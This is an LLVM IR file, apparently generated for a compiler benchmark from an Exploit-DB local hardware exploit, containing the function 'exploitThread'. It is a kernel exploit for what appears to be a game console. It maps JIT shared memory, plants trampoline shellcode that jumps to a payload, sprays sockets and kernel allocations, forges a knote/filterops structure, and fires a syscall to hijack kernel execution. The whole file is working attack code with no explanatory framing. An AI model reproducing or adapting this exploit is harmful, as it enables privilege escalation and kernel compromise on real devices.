; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/hardware/local/extr_44206.c_exploitThread.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/hardware/local/extr_44206.c_exploitThread.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.knote = type { %struct.filterops* }
%struct.filterops = type { i8* }

@.str = private unnamed_addr constant [27 x i8] c"[+] Entered exploitThread\0A\00", align 1
@PAGE_SIZE = common dso_local global i32 0, align 4
@PROT_READ = common dso_local global i32 0, align 4
@PROT_WRITE = common dso_local global i32 0, align 4
@MAP_ANONYMOUS = common dso_local global i32 0, align 4
@MAP_PRIVATE = common dso_local global i32 0, align 4
@__const.exploitThread.trampolinecode = private unnamed_addr constant [24 x i32] [i32 88, i32 72, i32 184, i32 25, i32 57, i32 64, i32 130, i32 255, i32 255, i32 255, i32 255, i32 80, i32 72, i32 184, i32 190, i32 186, i32 173, i32 222, i32 222, i32 192, i32 173, i32 222, i32 255, i32 224], align 16
@PROT_CPU_READ = common dso_local global i32 0, align 4
@PROT_CPU_WRITE = common dso_local global i32 0, align 4
@PROT_CPU_EXEC = common dso_local global i32 0, align 4
@PROT_EXEC = common dso_local global i32 0, align 4
@MAP_SHARED = common dso_local global i32 0, align 4
@MAP_TYPE = common dso_local global i32 0, align 4
@payload = common dso_local global i64 0, align 8
@.str.1 = private unnamed_addr constant [25 x i8] c"[+] Creating %d sockets\0A\00", align 1
@.str.2 = private unnamed_addr constant [4 x i8] c"sss\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [23 x i8] c"[+] allocation = %llp\0A\00", align 1
@.str.4 = private unnamed_addr constant [16 x i8] c"[+] Result: %d\0A\00", align 1
@.str.5 = private unnamed_addr constant [16 x i8] c"[+] Freeing m2\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i8* @exploitThread(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32*, align 8
  %8 = alloca i32*, align 8
  %9 = alloca i32, align 4
  %10 = alloca %struct.knote, align 8
  %11 = alloca %struct.filterops, align 8
  %12 = alloca %struct.knote**, align 8
  %13 = alloca i8*, align 8
  %14 = alloca i8*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca [24 x i32], align 16
  %18 = alloca [8192 x i32], align 16
  %19 = alloca [50 x i32], align 16
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  %28 = call i32 (i8*, ...) @printfsocket(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str, i64 0, i64 0))
  store i32 32768, i32* %3, align 4
  store i32 32768, i32* %4, align 4
  %29 = load i32, i32* %3, align 4
  %30 = load i32, i32* %4, align 4
  %31 = add nsw i32 %29, %30
  store i32 %31, i32* %5, align 4
  %32 = load i32, i32* %5, align 4
  %33 = load i32, i32* @PAGE_SIZE, align 4
  %34 = add nsw i32 %32, %33
  %35 = sub nsw i32 %34, 1
  %36 = load i32, i32* @PAGE_SIZE, align 4
  %37 = sub nsw i32 %36, 1
  %38 = xor i32 %37, -1
  %39 = and i32 %35, %38
  store i32 %39, i32* %6, align 4
  %40 = load i32, i32* %6, align 4
  %41 = load i32, i32* @PAGE_SIZE, align 4
  %42 = add nsw i32 %40, %41
  %43 = load i32, i32* @PROT_READ, align 4
  %44 = load i32, i32* @PROT_WRITE, align 4
  %45 = or i32 %43, %44
  %46 = load i32, i32* @MAP_ANONYMOUS, align 4
  %47 = load i32, i32* @MAP_PRIVATE, align 4
  %48 = or i32 %46, %47
  %49 = call i8* @mmap(i32* null, i32 %42, i32 %45, i32 %48, i32 -1, i32 0)
  %50 = bitcast i8* %49 to i32*
  store i32* %50, i32** %7, align 8
  %51 = load i32*, i32** %7, align 8
  %52 = load i32, i32* %6, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds i32, i32* %51, i64 %53
  %55 = load i32, i32* @PAGE_SIZE, align 4
  %56 = call i32 @munmap(i32* %54, i32 %55)
  %57 = load i32*, i32** %7, align 8
  %58 = load i32, i32* %6, align 4
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds i32, i32* %57, i64 %59
  %61 = load i32, i32* %5, align 4
  %62 = sext i32 %61 to i64
  %63 = sub i64 0, %62
  %64 = getelementptr inbounds i32, i32* %60, i64 %63
  store i32* %64, i32** %8, align 8
  %65 = load i32, i32* %3, align 4
  %66 = sext i32 %65 to i64
  %67 = add nsw i64 4294967296, %66
  %68 = sdiv i64 %67, 4
  %69 = trunc i64 %68 to i32
  store i32 %69, i32* %9, align 4
  %70 = load i32*, i32** %8, align 8
  %71 = load i32, i32* %3, align 4
  %72 = sext i32 %71 to i64
  %73 = getelementptr inbounds i32, i32* %70, i64 %72
  %74 = bitcast i32* %73 to %struct.knote**
  store %struct.knote** %74, %struct.knote*** %12, align 8
  %75 = load %struct.knote**, %struct.knote*** %12, align 8
  %76 = getelementptr inbounds %struct.knote*, %struct.knote** %75, i64 2
  store %struct.knote* %10, %struct.knote** %76, align 8
  %77 = getelementptr inbounds %struct.knote, %struct.knote* %10, i32 0, i32 0
  store %struct.filterops* %11, %struct.filterops** %77, align 8
  store i8* null, i8** %13, align 8
  store i8* null, i8** %14, align 8
  %78 = bitcast [24 x i32]* %17 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %78, i8* align 16 bitcast ([24 x i32]* @__const.exploitThread.trampolinecode to i8*), i64 96, i1 false)
  %79 = load i32, i32* @PAGE_SIZE, align 4
  %80 = load i32, i32* @PROT_CPU_READ, align 4
  %81 = load i32, i32* @PROT_CPU_WRITE, align 4
  %82 = or i32 %80, %81
  %83 = load i32, i32* @PROT_CPU_EXEC, align 4
  %84 = or i32 %82, %83
  %85 = call i32 @sceKernelJitCreateSharedMemory(i32 0, i32 %79, i32 %84, i32* %15)
  %86 = load i32, i32* %15, align 4
  %87 = load i32, i32* @PROT_CPU_READ, align 4
  %88 = load i32, i32* @PROT_CPU_WRITE, align 4
  %89 = or i32 %87, %88
  %90 = call i32 @sceKernelJitCreateAliasOfSharedMemory(i32 %86, i32 %89, i32* %16)
  %91 = load i32, i32* @PAGE_SIZE, align 4
  %92 = load i32, i32* @PROT_READ, align 4
  %93 = load i32, i32* @PROT_EXEC, align 4
  %94 = or i32 %92, %93
  %95 = load i32, i32* @MAP_SHARED, align 4
  %96 = load i32, i32* %15, align 4
  %97 = call i8* @mmap(i32* null, i32 %91, i32 %94, i32 %95, i32 %96, i32 0)
  store i8* %97, i8** %14, align 8
  %98 = load i32, i32* @PAGE_SIZE, align 4
  %99 = load i32, i32* @PROT_READ, align 4
  %100 = load i32, i32* @PROT_WRITE, align 4
  %101 = or i32 %99, %100
  %102 = load i32, i32* @MAP_PRIVATE, align 4
  %103 = load i32, i32* @MAP_TYPE, align 4
  %104 = or i32 %102, %103
  %105 = load i32, i32* %16, align 4
  %106 = call i8* @mmap(i32* null, i32 %98, i32 %101, i32 %104, i32 %105, i32 0)
  store i8* %106, i8** %13, align 8
  %107 = load i8*, i8** %13, align 8
  %108 = getelementptr inbounds [24 x i32], [24 x i32]* %17, i64 0, i64 0
  %109 = call i32 @memcpy(i8* %107, i32* %108, i32 96)
  %110 = load i64, i64* @payload, align 8
  %111 = inttoptr i64 %110 to i8*
  %112 = load i8*, i8** %13, align 8
  %113 = getelementptr i8, i8* %112, i64 14
  %114 = bitcast i8* %113 to i8**
  store i8* %111, i8** %114, align 8
  %115 = load i8*, i8** %14, align 8
  %116 = getelementptr inbounds %struct.filterops, %struct.filterops* %11, i32 0, i32 0
  store i8* %115, i8** %116, align 8
  store i32 0, i32* %20, align 4
  store i32 0, i32* %21, align 4
  %117 = load i32, i32* %3, align 4
  %118 = sub nsw i32 %117, 2048
  %119 = sdiv i32 %118, 8
  store i32 %119, i32* %22, align 4
  %120 = load i32, i32* %22, align 4
  %121 = call i32 (i8*, ...) @printfsocket(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.1, i64 0, i64 0), i32 %120)
  store i32 0, i32* %23, align 4
  br label %122

122:                                              ; preds = %144, %1
  %123 = load i32, i32* %23, align 4
  %124 = icmp slt i32 %123, 8192
  br i1 %124, label %125, label %147

125:                                              ; preds = %122
  %126 = load i32, i32* @AF_INET, align 4
  %127 = load i32, i32* @SOCK_STREAM, align 4
  %128 = call i32 @sceNetSocket(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.2, i64 0, i64 0), i32 %126, i32 %127, i32 0)
  %129 = load i32, i32* %23, align 4
  %130 = sext i32 %129 to i64
  %131 = getelementptr inbounds [8192 x i32], [8192 x i32]* %18, i64 0, i64 %130
  store i32 %128, i32* %131, align 4
  %132 = load i32, i32* %23, align 4
  %133 = sext i32 %132 to i64
  %134 = getelementptr inbounds [8192 x i32], [8192 x i32]* %18, i64 0, i64 %133
  %135 = load i32, i32* %134, align 4
  %136 = load i32, i32* %22, align 4
  %137 = icmp sge i32 %135, %136
  br i1 %137, label %138, label %143

138:                                              ; preds = %125
  %139 = load i32, i32* %23, align 4
  %140 = add nsw i32 %139, 1
  %141 = sext i32 %140 to i64
  %142 = getelementptr inbounds [8192 x i32], [8192 x i32]* %18, i64 0, i64 %141
  store i32 -1, i32* %142, align 4
  br label %147

143:                                              ; preds = %125
  br label %144

144:                                              ; preds = %143
  %145 = load i32, i32* %23, align 4
  %146 = add nsw i32 %145, 1
  store i32 %146, i32* %23, align 4
  br label %122

147:                                              ; preds = %138, %122
  store i32 0, i32* %24, align 4
  br label %148

148:                                              ; preds = %163, %147
  %149 = load i32, i32* %24, align 4
  %150 = icmp slt i32 %149, 50
  br i1 %150, label %151, label %166

151:                                              ; preds = %148
  %152 = load i32, i32* %3, align 4
  %153 = load i32, i32* %22, align 4
  %154 = call i32 @kernelAllocation(i32 %152, i32 %153)
  %155 = load i32, i32* %24, align 4
  %156 = sext i32 %155 to i64
  %157 = getelementptr inbounds [50 x i32], [50 x i32]* %19, i64 0, i64 %156
  store i32 %154, i32* %157, align 4
  %158 = load i32, i32* %24, align 4
  %159 = sext i32 %158 to i64
  %160 = getelementptr inbounds [50 x i32], [50 x i32]* %19, i64 0, i64 %159
  %161 = load i32, i32* %160, align 4
  %162 = call i32 (i8*, ...) @printfsocket(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.3, i64 0, i64 0), i32 %161)
  br label %163

163:                                              ; preds = %151
  %164 = load i32, i32* %24, align 4
  %165 = add nsw i32 %164, 1
  store i32 %165, i32* %24, align 4
  br label %148

166:                                              ; preds = %148
  %167 = load i32, i32* %3, align 4
  %168 = load i32, i32* %22, align 4
  %169 = call i32 @kernelAllocation(i32 %167, i32 %168)
  store i32 %169, i32* %20, align 4
  %170 = load i32, i32* %3, align 4
  %171 = load i32, i32* %22, align 4
  %172 = call i32 @kernelAllocation(i32 %170, i32 %171)
  store i32 %172, i32* %21, align 4
  %173 = load i32, i32* %20, align 4
  %174 = call i32 @kernelFree(i32 %173)
  %175 = load i32*, i32** %7, align 8
  %176 = call i32 @syscall(i32 597, i32 1, i32* %175, i32* %9)
  store i32 %176, i32* %25, align 4
  %177 = load i32, i32* %25, align 4
  %178 = call i32 (i8*, ...) @printfsocket(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.4, i64 0, i64 0), i32 %177)
  %179 = call i32 (i8*, ...) @printfsocket(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.5, i64 0, i64 0))
  %180 = load i32, i32* %21, align 4
  %181 = call i32 @kernelFree(i32 %180)
  store i32 0, i32* %26, align 4
  br label %182

182:                                              ; preds = %198, %166
  %183 = load i32, i32* %26, align 4
  %184 = icmp slt i32 %183, 8192
  br i1 %184, label %185, label %201

185:                                              ; preds = %182
  %186 = load i32, i32* %26, align 4
  %187 = sext i32 %186 to i64
  %188 = getelementptr inbounds [8192 x i32], [8192 x i32]* %18, i64 0, i64 %187
  %189 = load i32, i32* %188, align 4
  %190 = icmp eq i32 %189, -1
  br i1 %190, label %191, label %192

191:                                              ; preds = %185
  br label %201

192:                                              ; preds = %185
  %193 = load i32, i32* %26, align 4
  %194 = sext i32 %193 to i64
  %195 = getelementptr inbounds [8192 x i32], [8192 x i32]* %18, i64 0, i64 %194
  %196 = load i32, i32* %195, align 4
  %197 = call i32 @sceNetSocketClose(i32 %196)
  br label %198

198:                                              ; preds = %192
  %199 = load i32, i32* %26, align 4
  %200 = add nsw i32 %199, 1
  store i32 %200, i32* %26, align 4
  br label %182

201:                                              ; preds = %191, %182
  store i32 0, i32* %27, align 4
  br label %202

202:                                              ; preds = %211, %201
  %203 = load i32, i32* %27, align 4
  %204 = icmp slt i32 %203, 50
  br i1 %204, label %205, label %214

205:                                              ; preds = %202
  %206 = load i32, i32* %27, align 4
  %207 = sext i32 %206 to i64
  %208 = getelementptr inbounds [50 x i32], [50 x i32]* %19, i64 0, i64 %207
  %209 = load i32, i32* %208, align 4
  %210 = call i32 @kernelFree(i32 %209)
  br label %211

211:                                              ; preds = %205
  %212 = load i32, i32* %27, align 4
  %213 = add nsw i32 %212, 1
  store i32 %213, i32* %27, align 4
  br label %202

214:                                              ; preds = %202
  %215 = load i32*, i32** %7, align 8
  %216 = load i32, i32* %6, align 4
  %217 = call i32 @munmap(i32* %215, i32 %216)
  ret i8* null
}

declare dso_local i32 @printfsocket(i8*, ...) #1

declare dso_local i8* @mmap(i32*, i32, i32, i32, i32, i32) #1

declare dso_local i32 @munmap(i32*, i32) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #2

declare dso_local i32 @sceKernelJitCreateSharedMemory(i32, i32, i32, i32*) #1

declare dso_local i32 @sceKernelJitCreateAliasOfSharedMemory(i32, i32, i32*) #1

declare dso_local i32 @memcpy(i8*, i32*, i32) #1

declare dso_local i32 @sceNetSocket(i8*, i32, i32, i32) #1

declare dso_local i32 @kernelAllocation(i32, i32) #1

declare dso_local i32 @kernelFree(i32) #1

declare dso_local i32 @syscall(i32, i32, i32*, i32*) #1

declare dso_local i32 @sceNetSocketClose(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { argmemonly nounwind willreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
